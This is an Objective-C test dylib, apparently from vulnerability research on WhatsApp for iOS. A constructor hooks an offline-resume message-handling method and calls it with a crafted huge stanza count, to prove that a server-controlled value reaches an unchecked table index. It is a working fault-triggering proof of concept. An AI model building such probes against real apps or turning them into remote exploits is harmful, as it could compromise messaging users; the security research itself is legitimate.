// ME73 minimal test dylib — t7 lead: didOfflineResumeStartWithType:totalStanzasCount:
// (category WAIncomingMessageHandlingMain on WAMessageBatchingConfigurator).
// NEW 26.24.72 static: selector dispatched via Swift async thunks; helper @0x100337b88
// does ldrsw x8,[x8,#0x10] -> ldr x25,[x21,x8] — UNCHECKED table index (ME72n bug class).
// The count parameter is SERVER-SUPPLIED (XMPP offline-resume response = stanza data).
// Experiment: swizzle the selector, drive orig with crafted huge count (0x7FFFFFFF),
// log outcome to marker. Crash -> on-device proof of remote-reachable stanza->index fault.
//
// Reuses ME72j lessons: FAST constructor (4x250ms), inline drive on main thread
// (detached pthread frozen by app suspension), marker-file logging only.

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static NSString *wa_markerPath(void) {
    return [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/wafix_marker.txt"];
}

static void wa_marker(NSString *msg) {
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:wa_markerPath()];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:wa_markerPath() contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:wa_markerPath()];
    }
    if (!fh) return;
    @try {
        [fh seekToEndOfFile];
        [fh writeData:[[msg stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    } @catch (NSException *e) {}
}

// signature: didOfflineResumeStartWithType:(NSUInteger)type totalStanzasCount:(NSUInteger)count
static void (*orig_offlineResume)(id, SEL, NSUInteger, NSUInteger);
static void hook_offlineResume(id self, SEL _cmd, NSUInteger type, NSUInteger count) {
    wa_marker([NSString stringWithFormat:@"[hook] didOfflineResumeStartWithType: totalStanzasCount=%lu (self=%@)", (unsigned long)count, NSStringFromClass([self class])]);
    orig_offlineResume(self, _cmd, type, count);
}

static int g_hooked = 0;

static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
    Method m = class_getInstanceMethod(cls, sel);
    if (!m) {
        wa_marker([NSString stringWithFormat:@"[swz] MISSING %@ %@", NSStringFromClass(cls), NSStringFromSelector(sel)]);
        return;
    }
    *origOut = (void *)method_getImplementation(m);
    IMP old = class_replaceMethod(cls, sel, newImp, method_getTypeEncoding(m));
    wa_marker([NSString stringWithFormat:@"[swz] hooked %@ %@ (orig=%p)", NSStringFromClass(cls), NSStringFromSelector(sel), old]);
}

static void run_drive_inline(void) {
    wa_marker(@"[drive] starting offline-resume drive (crafted count=0x7FFFFFFF)");
    Class c = NSClassFromString(@"WAMessageBatchingConfigurator");
    if (!c) { wa_marker(@"[drive] WAMessageBatchingConfigurator NOT FOUND"); return; }
    if (!orig_offlineResume) { wa_marker(@"[drive] SKIP (orig not hooked)"); return; }

    // crafted instance via class_createInstance (no init, just the memory)
    __unsafe_unretained id selfObj = class_createInstance(c, 0);
    if (!selfObj) { wa_marker(@"[drive] class_createInstance failed"); return; }
    wa_marker([NSString stringWithFormat:@"[drive] calling orig with type=1 count=0x7FFFFFFF..."]);
    orig_offlineResume(selfObj, NSSelectorFromString(@"didOfflineResumeStartWithType:totalStanzasCount:"), 1, 0x7FFFFFFF);
    wa_marker(@"[drive] count=0x7FFFFFFF: RETURNED (no crash)");

    wa_marker(@"[drive] calling orig with type=1 count=100 (control)...");
    orig_offlineResume(selfObj, NSSelectorFromString(@"didOfflineResumeStartWithType:totalStanzasCount:"), 1, 100);
    wa_marker(@"[drive] count=100: RETURNED (no crash)");

    wa_marker(@"[drive] offline-resume drive complete");
}

__attribute__((constructor))
static void waInit(void) {
    @autoreleasepool {
        wa_marker(@"=== waContainerFix ME73 (offline-resume count drive) constructor ===");

        for (int attempt = 0; attempt < 4; attempt++) {
            if (!g_hooked) {
                Class c = NSClassFromString(@"WAMessageBatchingConfigurator");
                if (c) {
                    wa_swizzle(c, NSSelectorFromString(@"didOfflineResumeStartWithType:totalStanzasCount:"), (IMP)hook_offlineResume, (void **)&orig_offlineResume);
                    if (orig_offlineResume) g_hooked = 1;
                } else {
                    wa_marker(@"[init] WAMessageBatchingConfigurator not loaded yet");
                }
            }
            wa_marker([NSString stringWithFormat:@"[init] attempt %d: hooked=%d", attempt + 1, g_hooked]);
            if (g_hooked) break;
            usleep(250000);
        }
        wa_marker(@"[init] ME73 constructor complete");

        run_drive_inline();
    }
}
